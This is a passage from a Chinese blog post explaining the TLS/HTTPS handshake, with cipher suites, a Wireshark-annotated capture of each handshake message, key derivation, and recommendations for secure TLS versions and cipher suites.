key所用的算法，主要有两类。分别是</p><p>（a）基于Diffie-Hellman交换算法的：ECDHE，DHE，DH，ECDH</p><p>DH密钥交换原理如下图,图中的k即为pre-master key:</p><img src="/2020/08/26/apple/1597651450749.png" alt="1597651450749" style="zoom:67%;"><p>DH和ECDH主要不同在于基于的困难问题稍有不同，DH是基于离散对数困难问题，而ECDH是基于椭圆曲线上的离散对数问题；任何基于离散对数上的都可以换算到椭圆曲线上。椭圆曲线上密钥长度只需要较短的即可达到基础域中较长的安全性，例如160比特的椭圆曲线密钥和1024比特的RSA密钥的安全性相当。越小的密钥在速度、效率、带宽、存储上有着许多优势 。</p><p>对于DHE与DH的主要不同在于后面有个E，E代表了“临时”，即在握手流程中，作为服务器端，ECDH少了一步计算Pb的过程，Pb用证书中的公钥代替，而证书对应的私钥就是Xb。由此可见，使用ECDH密钥交换算法，服务器必须采用ECC证书；服务器不发送server key exchange报文，因为发送certificate报文时，证书本身就包含了Pb信息。 </p><p>（b）基于RSA的密钥交换算法：客户端利用RSA公钥加密pre-master key，服务器端私钥解密出预主密钥</p><img src="/2020/08/26/apple/1597651364544.png" alt="1597651364544" style="zoom: 67%;"><p>综上几种密钥交换算法比较如下表所示:</p><table><thead><tr><th></th><th>ECDHE</th><th>ECDH</th><th>DHE</th><th>DH</th><th>RSA</th></tr></thead><tbody><tr><td>server key exchange</td><td>Y</td><td>N（证书中的公钥Pb）</td><td>Y</td><td>N（证书中的公钥及Pb）</td><td>N</td></tr><tr><td>前向安全性</td><td>Y</td><td>N</td><td>Y</td><td>N</td><td>N</td></tr></tbody></table><p>（2）第二部分为身份认证算法，即数字签名算法，这里根据密码套件不同，代表的含义也不同。</p><p>（a）密钥交换算法为ECDHE情况下，签名算法指的是 serverkeyexchange被签名的算法，只有2种ECDSA和RSA，具体是哪种完全取决于证书的公钥类型（ECC RSA）。如果你的证书是ECC公钥，那么服务器不可能选择ECDHE_RSA这种套件。 </p><p>（b）ECDH的情况下，签名算法 指的是 证书自身的被签名算法。 如果服务器部署的是RSA签名算法的证书，那么必须使用ECDH_RSA套件；反之亦然。 </p><p>（3）第三部分AES_128_GCM，主要为加密算法，一般是加密算法+加密强度（128位/256位）+工作模式（CBC/GCM），用于后面加密传输所用的算法，保证数据传输过程中的机密性。</p><p>（4） 第四部分SHA256为哈希算法，用于HMAC和PRF，保证数据在传输过程中的完整性。</p><h2 id="2-https协议总框架"><a href="#2-https协议总框架" class="headerlink" title="2 https协议总框架"></a>2 https协议总框架</h2><p>如下图为https协议总框架,首先</p><p>非对称协商会话密钥，然后用会话密钥加密传输。</p><img src="/2020/08/26/apple/1597630781001.png" alt="1597630781001" style="zoom:67%;"><p>下面以具体wireshark抓包具体报文进行解说。（密码套件TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256为例）拦截<a href="http://www.google.com的https连接报文.其中2.1到2.6为握手层协议,2.7为记录协议/">www.google.com的https连接报文。其中2.1到2.6为握手层协议,2.7为记录协议</a>.</p><h3 id="2-1-Client-hello"><a href="#2-1-Client-hello" class="headerlink" title="2.1 Client hello"></a>2.1 Client hello</h3><p>这条消息是客户端向服务器端发送连接请求。</p><p><img src="/2020/08/26/apple/1597635473766.png" alt="1597635473766"></p><p>Version: 协议版本（protocol version）指示客户端支持的最佳协议版本</p><p>Random: 一个 32 字节数据，28 字节是随机生成的 (图中的 Random Bytes)；剩余的 4 字节包含额外的信息，与客户端时钟有关 (图中使用的是 GMT Unix Time)。在握手时，客户端和服务器都会提供随机数，客户端的暂记作 random_C (用于后续的密钥的生成)。这种随机性对每次握手都是独一无二的，在身份验证中起着举足轻重的作用。它可以防止 <a href="https://zh.wikipedia.org/wiki/%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB">重放攻击</a>，并确认初始数据交换的完整性。</p><p>Session ID: 在第一次连接时，会话 ID（session ID）字段是空的，这表示客户端并不希望恢复某个已存在的会话。典型的会话 ID 包含 32 字节随机生成的数据，一般由服务端生成通过 ServerHello 返回给客户端。</p><p>Cipher Suites: 密码套件（cipher suite）块是由客户端支持的所有密码套件组成的列表，该列表是按优先级顺序排列的.</p><pre><code>Cipher Suites (19 suites)    Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384 (0xc02c)    Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256 (0xc02b)    Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (0xc030)    Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (0xc02f)    Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384 (0xc024)    Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256 (0xc023)    Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384 (0xc028)    Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 (0xc027)    Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA (0xc00a)    Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA (0xc009)    Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (0xc014)    Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (0xc013)    Cipher Suite: TLS_RSA_WITH_AES_256_GCM_SHA384 (0x009d)    Cipher Suite: TLS_RSA_WITH_AES_128_GCM_SHA256 (0x009c)    Cipher Suite: TLS_RSA_WITH_AES_256_CBC_SHA256 (0x003d)    Cipher Suite: TLS_RSA_WITH_AES_128_CBC_SHA256 (0x003c)    Cipher Suite: TLS_RSA_WITH_AES_256_CBC_SHA (0x0035)    Cipher Suite: TLS_RSA_WITH_AES_128_CBC_SHA (0x002f)    Cipher Suite: TLS_RSA_WITH_3DES_EDE_CBC_SHA (0x000a)</code></pre><p>Compression: 客户端可以提交一个或多个支持压缩的方法。默认的压缩方法是 null，代表没有压缩</p><p>Extensions: 扩展（extension）块由任意数量的扩展组成。这些扩展会携带额外数据</p><h3 id="2-2-Server-hello"><a href="#2-2-Server-hello" class="headerlink" title="2.2 Server hello"></a>2.2 Server hello</h3><p>这条消息是服务器对client hello的响应。</p><p><img src="/2020/08/26/apple/1597635614246.png" alt="1597635614246"></p><p>这个消息的结构与 ClientHello 类似，只是每个字段只包含一个选项，其中包含服务端的 random_S 参数 (用于后续的密钥协商)。服务器无需支持客户端支持的最佳版本。如果服务器不支持与客户端相同的版本，可以提供某个其他版本以期待客户端能够接受。</p><p>图中的 <code>Cipher Suite</code> 是后续密钥协商和身份验证要用的加密套件TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256，此处选择的密钥交换与签名算法是 ECDHE_RSA，对称加密算法是 AES-128，后面会讲到这个</p><p>还有一点默认情况下 TLS 压缩都是关闭的，因为 <a href="https://zh.wikipedia.org/wiki/CRIME">CRIME</a> 攻击会利用 TLS 压缩恢复加密认证 cookie，实现会话劫持，而且一般配置 gzip 等内容压缩后再压缩 TLS 分片效益不大又额外占用资源，所以一般都关闭 TLS 压缩</p><h3 id="2-3-Certificate"><a href="#2-3-Certificate" class="headerlink" title="2.3 Certificate"></a>2.3 Certificate</h3><p>典型的 Certificate 消息用于携带服务器 X.509 <a href="https://zh.wikipedia.org/wiki/%E4%BF%A1%E4%BB%BB%E9%8F%88">证书链</a>。 服务器必须保证它发送的证书与选择的算法套件一致。</p><p><img src="/2020/08/26/apple/1597645649605.png" alt="1597645649605"></p><h4 id="2-3-1-证书内容"><a href="#2-3-1-证书内容" class="headerlink" title="2.3.1 证书内容"></a>2.3.1 证书内容</h4><p>注意证书链的顺序，最下层证书在前（用户证书在前，上级证书在后）。发送的证书是二进制格式，并非base64之后的格式。有个技巧，在wireshark右键<strong>“导出分组字节流”</strong>功能，然后保存证书,后缀为der，是可以变成一个正常证书的（二进制格式）。</p><img src="/2020/08/26/apple/1597648718865.png" alt="1597648718865" style="zoom:150%;"><p>下面对证书内容进行分析：</p><p>图中从右到左分别是1级根证书为Google Trust Services，二级中间证书为GTS CA，三级证书为google-analytics；从上到下为每个证书中的详细信息。</p><p>首先需要特别说明证书中的重点内容是什么？</p><p>（1）版本：Version，V3。对应的是X.509 V3标准</p><p>（2）序列号：证书颁发者唯一序列号</p><p>（3）签名算法：<strong>注意！证书中的签名算法指的是上级证书运行的签名算法，生成数字签名的；而不是</strong></p><p><strong>本级证书拥有的签名算法。</strong>例如，3级证书中的签名算法为sha256RSA，应该与2级证书的公钥RSA是一致的。</p><p>（４）签名哈希算法：同样是上级证书签名时用的哈希算法。</p><p>（５）公钥及公钥参数:<strong>注意本即证书的公钥，该公钥不是用于验证2级证书生成的数字签名的.**该公钥是用于后面</strong>server key exchange的;具体用法如下:</p><p>(a)对于ECDHE和DHE密钥交换算法,服务器端需要server key exchange,发送用于DH的公钥Pb及对公钥的数字签名(防止公钥在通信过程被篡改),那服务器证书的公钥就是用来验证该签名的;</p><p>(b)对于不需要server key exchange的DH,ECDH密钥交换算法,服务器证书中的公钥就是DH密钥交换的Pb;</p><p>(c) 对于不需要server key exchange的RSA密钥交换算法:服务器证书中的公钥是用于加密第三个随机数预主密钥pre-master key的.</p><h4 id="2-3-2-证书验证过程"><a href="#2-3-2-证书验证过程" class="headerlink" title="2.3.2 证书验证过程"></a>2.3.2 证书验证过程</h4><p>证书链验证过程如下:(简易图)</p><p>首先利用一级证书中的RSA公钥验证二级证书,再用二级证书中的RSA公钥验证三级证书,即服务器证书;服务器证书中的ECC公钥,公钥参数ECDSA用于密钥交换,具体功能在2.3.1已阐述;</p><p><img src="/2020/08/26/apple/1597651071958.png" alt="1597651071958"></p><h3 id="2-4-第三个随机数的密钥协商"><a href="#2-4-第三个随机数的密钥协商" class="headerlink" title="2.4  第三个随机数的密钥协商"></a>2.4  第三个随机数的密钥协商</h3><p>不同的密码套件,也会有不一样的密钥协商算法具体1.3节已分析;该次交互选择的密码交互算法为ECDHE_ECDSA;</p><h4 id="2-4-1-Server-key-exchange"><a href="#2-4-1-Server-key-exchange" class="headerlink" title="2.4.1 Server key exchange"></a>2.4.1 Server key exchange</h4><p>从下面可以看到报文信息如下:</p><p>(1)公钥Pubkey:服务器端发送Pb(对应的私钥为b),以及DH用到的相关参数,比如选择的椭圆曲线等</p><p>(2)数字签名Signature:服务器利用私钥b运行ECDSA签名算法生成的数字签名,保证公钥来源的可靠性和完整性,客户端收到该签名后,用之前收到的服务器证书中的ECC公钥进行签名验证.</p><p><img src="/2020/08/26/apple/1597651555493.png" alt="1597651555493"></p><h4 id="2-4-2-Client-key-exchange"><a href="#2-4-2-Client-key-exchange" class="headerlink" title="2.4.2 Client key exchange"></a>2.4.2 Client key exchange</h4><p>客户端发送公钥Pa</p><p><img src="/2020/08/26/apple/1597652043883.png" alt="1597652043883"></p><p>然后双方根据Diffie-Hellman算法分别计算出pre-master key;具体计算过程在1.3已写.</p><h3 id="2-5-Finished-Encrypted-Handshake-Message"><a href="#2-5-Finished-Encrypted-Handshake-Message" class="headerlink" title="2.5 Finished (Encrypted Handshake Message)"></a>2.5 Finished (Encrypted Handshake Message)</h3><p>这个报文的目的就是告诉对端自己在整个握手过程中收到了什么数据，发送了什么数据。来保证中间没人篡改报文。客户端和服务器端都会分别发送.</p><p>其次，这个报文作用就是确认密钥的正确性。因为Encrypted handshake message是使用对称密钥进行加密的第一个报文，如果这个报文加解密校验成功，那么就说明对称密钥是正确的。</p><p>计算方法也比较简单，将之前<strong>所有</strong>的握手数据（包括接受、发送），计算md运算，然后计算prf，然后就是使用协商好的对称密钥进行加密了。 ( 从client hello开始，到目前准备发送“Encrypted handshake message”前，自己所有收到和发送的handshake类型的握手数据。 )</p><p><img src="/2020/08/26/apple/1597653653860.png" alt="1597653653860"></p><h3 id="2-6-密钥产生"><a href="#2-6-密钥产生" class="headerlink" title="2.6 密钥产生"></a>2.6 密钥产生</h3><p><img src="/2020/08/26/apple/1597652305214.png" alt="1597652305214"></p><p>如上图所示,此时客户端,服务器端都已经获取全部的计算协商密钥需要的信息: 两个明文随机数 CR 和 SR与自己计算产生的 Pre-master，然后得到主密钥master.为了保证信息的完整性和机密性，TSL需要有六个密钥：四个密钥和两个IV。为了信息的可信性，客户端需要一个密钥（HMAC），为了加密要有一个密钥，为了分组加密要一个IV，服务也是如此。</p><pre><code>master= PRF(Pre_master, &quot;master secret&quot;, CR + SR)</code></pre><h4 id="2-6-1-生成主密钥Master-key"><a href="#2-6-1-生成主密钥Master-key" class="headerlink" title="2.6.1 生成主密钥Master key"></a>2.6.1 生成主密钥Master key</h4><p>主密钥Master key的生成如下,图中的MD5算法是在密码套件中指定的;根据三个参数预备主密钥PM,服务器端随机数SR,客户端随机数CR,经过不断的迭代,最终生成48字节的主密钥master key.</p><p><img src="/2020/08/26/apple/1598427741876.png" alt="1598427741876"></p><h4 id="2-6-2-生成密钥材料"><a href="#2-6-2-生成密钥材料" class="headerlink" title="2.6.2 生成密钥材料"></a>2.6.2 生成密钥材料</h4><p> 密钥材料需要以下6个,具体生成过程如下图所示.</p><p>(1)客户端MAC密钥 :Auth .Key</p><p>(2)服务器端MAC密钥 :Auth .Key</p><p>(3) 客户端加密密钥及IV:Enc.key</p><p>(4) 服务器端加密密钥及IV:Enc.key,IV</p><p>(5) 客户端分组密码需要的IV</p><p>(6) 服务器端分组密码需要的IV</p><p><img src="/2020/08/26/apple/1598427757814.png" alt="1598427757814"> </p><p><img src="/2020/08/26/apple/1598427767706.png" alt="1598427767706"></p><h3 id="2-7-记录协议"><a href="#2-7-记录协议" class="headerlink" title="2.7  记录协议"></a>2.7  记录协议</h3><p>记录协议负责在传输连接上交换的所有底层消息，并且可以配置加密。每一条 TLS 记录以一个短标头开始。标头包含记录内容的类型 (或子协议)、协议版本和长度。原始消息经过分段 (或者合并)、压缩、添加认证码、加密转为 TLS 记录的数据部分。 如下图所示.对应用数据进行分段,对分段信息先压缩,在加上对压缩进行的MAC,然后对压缩信息+MAC进行加密,最后加记录头,形成报文,发送.</p><p><img src="/2020/08/26/apple/1597653267305.png" alt="1597653267305"></p><p>报文如下:</p><p><img src="/2020/08/26/apple/1597653406484.png" alt="1597653406484"></p><h2 id="3-https-安全性分析"><a href="#3-https-安全性分析" class="headerlink" title="3 https 安全性分析"></a>3 https 安全性分析</h2><h3 id="3-1-TLS版本的选择"><a href="#3-1-TLS版本的选择" class="headerlink" title="3.1 TLS版本的选择"></a>3.1 TLS版本的选择</h3><p>目前在SSL/TLS家族中主要有7个协议: SSL v2, SSL v3, TLS v1.0, TLS v1.1, TLS v1.2和TLSv1.3。</p><p>1 SSL v2, SSL v3, TLS v1.0 , TLS v1.1协议均有明确的安全缺陷</p><ol><li><p>SSL v2: DROWN攻击</p></li><li><p>SSL v3: POODLE攻击</p></li><li><p>TLS v1.0: BEAST和POODLE攻击</p></li><li><p>TLS v1.1 密码套件较老,已不安全 </p></li></ol><p>2、TLS v1.2与v1.3目前均无已知的安全缺陷</p><p><strong>推荐使用TLS v1.2与v1.3.</strong></p><h3 id="3-2-密码套件的选择"><a href="#3-2-密码套件的选择" class="headerlink" title="3.2 密码套件的选择"></a>3.2 密码套件的选择</h3><p>从密码套件的各个部分去分析其安全性,具体如下:</p><p>(1)密钥交换：ECDHE，DHE，ECDH，DHE，ADH, RSA, PSK</p><p>其中RSA，ECDH，DH，PSK均不具有前向安全性，一旦私钥丢失，则以往所有的通信内容将会泄露，使用前向安全性算法（ECDHE，DHE），可以避免这种问题。</p><p>ADH为Anonymous DH，匿名DH算法，不提供身份验证，禁用。</p><p>PSK算法是预存key在客户端和服务端，因为PSK必须要预置密钥，这个预置的过程就代表了服务端已经知道有哪些客户端需要访问了，所以基于PSK的TLS适合在内部系统中使用，而不适合在公网环境用来提供Web服务。</p><p><strong>综上,推荐使用的密钥交换算法为:ECDHE，DHE</strong></p><p>(2)数字签名：ECDSA, RSA(2048位以上), DSS (又称DSA)</p><p>其中DSA只支持1024bits，不安全算法,RSA要2048位以上才安全.ECDSA速度较快,安全性也较高.</p><p><strong>推荐使用数字签名算法ECDSA和RSA.</strong></p><p>(3) 加密算法：<strong>DES，3DES ,**AES(256),ChaCha20</strong>,RC4, **ChaCha20</p><p>3DES运行缓慢且易被攻击。RC4已不安全</p><p>ChaCha20是一种流加密算法，实现较为简单，并且比纯软件实现的AES性能更好。</p><p>在支持AES指令的硬件平台上，推荐优先选择AES-GCM算法,不支持AES指令的硬件平台，ChaCha20性能优于AES</p><p>Camellia算法支持128比特的分组长度,128、192和256比特的密钥与AES的接口相同，Camellia算法128比特密钥的加、解密过程共有18轮,采用Feistel结构,加、解密过程完全相同,只是子密钥注入顺序相反</p><p>Camellia算法由NTT和Mitsubishi Electric Corporation于2000年联合开发，作为欧洲新一代的加密标准。与AES算法相比,Camellia算法在各种软硬件平台上表现出与之相当的加密速度。除了在各种软件和硬件平台上的高效性这一显著特点,它的另外一个特点是针对小规模硬件平台的设计.</p><p><strong>推荐使用AES(256),ChaCha20ChaCha20</strong></p><p>(4)<strong>工作模式：</strong>CBC，GCM</p><p>CBC 模式密码 —— 易受 BEAST 和 Lucky 13 攻击,禁用</p><p><strong>推荐使用:GCM</strong></p><p>(5)MAC：md5，SHA-1（又名SHA），SHA-2（又名SHA128，SHA256和SHA384）</p><p>​     SHA1存在碰攻击，如果HTTPS证书使用sha1，扩展存在中间人攻击；  Md5也被破解</p><p><strong>推荐使用SHA256和SHA384</strong></p><h3 id="3-3-优先使用的密码套件"><a href="#3-3-优先使用的密码套件" class="headerlink" title="3.3 优先使用的密码套件"></a>3.3 优先使用的密码套件</h3><p>TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256<br>TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384<br>TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256<br>TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384<br>TLS_DHE_RSA_WITH_AES_128_GCM_SHA256<br>TLS_DHE_RSA_WITH_AES_256_GCM_SHA384</p><h2 id="REF"><a href="#REF" class="headerlink" title="REF:"></a>REF:</h2><p> <a href="https://cshihong.github.io/2019/05/09/SSL%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/">https://cshihong.github.io/2019/05/09/SSL%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/</a> </p><p> <a href="https://juejin.im/post/6844903667577929742#heading-12">https://juejin.im/post/6844903667577929742#heading-12</a> </p><p> <a href="https://www.jianshu.com/p/cf8c2f2cd18a">https://www.jianshu.com/p/cf8c2f2cd18a</a> </p><p> <a href="https://www.cnblogs.com/zhuqil/archive/2012/10/06/ssl_detail.html">https://www.cnblogs.com/zhuqil/archive/2012/10/06/ssl_detail.html</a> </p><p> <a href="https://blog.csdn.net/mrpre/article/details/77868570">https://blog.csdn.net/mrpre/article/details/77868570</a> </p>]]></content>
      
      
      <categories>
          
          <category> 网络编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TLS </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
